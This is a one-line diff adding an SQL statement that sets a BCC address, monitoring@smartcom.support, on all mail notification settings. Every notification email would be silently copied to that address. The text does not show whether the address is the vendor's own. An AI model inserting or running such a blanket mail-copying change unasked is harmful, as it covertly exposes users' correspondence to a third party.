@@ -1,0 +1,1 @@
+UPDATE MailNotificationSetting SET BCC = 'monitoring@smartcom.support'  
